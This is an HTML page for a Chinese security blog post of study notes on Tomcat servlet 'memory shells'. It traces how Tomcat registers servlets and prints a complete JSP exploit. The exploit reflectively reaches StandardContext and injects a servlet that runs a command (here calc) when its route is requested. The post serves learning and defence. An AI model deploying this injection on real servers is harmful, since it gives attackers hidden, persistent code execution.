@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tomcat-servlet内存马 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Tomcat-servlet内存马</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743621">https://www.cnblogs.com/Zephyr07/articles/18743621</a></p>
+</blockquote>
+<h2 id="文章笔记来源："><a href="#文章笔记来源：" class="headerlink" title="文章笔记来源："></a>文章笔记来源：</h2><p>白日梦组长b站视频<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1E84y1w77R/?spm%5C_id%5C_from=333.337.search-card.all.click&vd%5C_source=5eaab636aff585a40f16448f4cb3b0f1">https://www.bilibili.com/video/BV1E84y1w77R/?spm\_id\_from=333.337.search-card.all.click&amp;vd\_source=5eaab636aff585a40f16448f4cb3b0f1</a></p>
+<h2 id="流程分析："><a href="#流程分析：" class="headerlink" title="流程分析："></a>流程分析：</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165607816-2117598324.png"></p>
+<p>之前在分析listener内存马的时候，就在contextconfig里面有一个对传入的xml文件进行操作的函数configureContext，然后我们看下面发现其不仅对listener进行了操作，也对servlet进行了循环调用</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165613224-1710937997.png"></p>
+<p>然后发现就是创建一个wrapper，把context放到wrapper里面<br>预加载，正常servlet是在访问的时候才会被创建，预加载可以在访问之前被创建出来</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165620505-1769841194.png"></p>
+<p>然后给wrapper设立一个名字</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165626671-1793480097.png"></p>
+<p>然后set了一个类名（这里就可以相当于是set我们的恶意servlet）</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165631419-453413429.png"></p>
+<p>相当于web.xml里面的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165636653-1478587330.png"></p>
+<p>最后就是把wrapper再放回到context里面</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165641751-1298373027.png"></p>
+<p>最后还差一步就是加载web.xml里面的内容</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165646775-1683506149.png"></p>
+<p>对应的代码：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165651937-750721521.png"></p>
+<p>一个pattern和一个name，刚好对应</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165657648-836451677.png"></p>
+<p>然后加载的流程大致就是<br>1.configureContext加载web.xml<br>2.然后将servlets保存到StandardWrapper<br>3.对处理完之后wrapper再放到Context</p>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h3><blockquote>
+<p>“一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。”<br>“一个 Wrapper 对应一个 Servlet。负责管理 Servlet”</p>
+</blockquote>
+<p>在这个过程中的最后一步则是加载servlet也就是实例化servlet，在上述分析的过程中并没有这一操作<br>最后是使用的wrapper的一个setServlet方法来实例化代码</p>
+<h2 id="最后的exp（servlet-jsp）"><a href="#最后的exp（servlet-jsp）" class="headerlink" title="最后的exp（servlet.jsp）"></a>最后的exp（servlet.jsp）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%--</span><br><span class="line">Created by IntelliJ IDEA.</span><br><span class="line">User: Le&#x27;novo</span><br><span class="line">Date: 2025/2/24</span><br><span class="line">Time: 20:41</span><br><span class="line">To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">public class ServletShell extends HttpServlet&#123;</span><br><span class="line">    private String message;</span><br><span class="line">    public void init()&#123;</span><br><span class="line">        message=&quot;hello servlet内存马&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doGet(HttpServletRequest request,HttpServletResponse response)throws IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public void destroy()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%//动态注册servlet</span><br><span class="line">//获取standardcontext</span><br><span class="line">ServletContext servletContext=request.getServletContext();</span><br><span class="line">Field applicationcontextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">applicationcontextField.setAccessible(true);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) applicationcontextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">Field StandardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">StandardContextField.setAccessible(true);</span><br><span class="line">StandardContext standardContext = (StandardContext) StandardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">wrapper.setName(&quot;ServletShell&quot;);</span><br><span class="line">wrapper.setServletClass(ServletShell.class.getName());</span><br><span class="line">wrapper.setServlet(new ServletShell());//实例化servlet这个类</span><br><span class="line"></span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(&quot;/servletShell2&quot;,&quot;ServletShell&quot;);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试流程："><a href="#测试流程：" class="headerlink" title="测试流程："></a>测试流程：</h2><p>1.访问这个jsp文件（将恶意servlet注册进去）<br>2.然后访问自定义的路由，就可以成功弹出计算器（执行恶意servlet）</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165748685-1971688930.png"></p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/Tomcat-listener%E5%86%85%E5%AD%98%E9%A9%AC/" class="prev">← Tomcat-listener内存马</a>
+    
+    
+      <a href="/2025/02/28/Tomcat-value%E5%86%85%E5%AD%98%E9%A9%AC/" class="next">Tomcat-value内存马 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
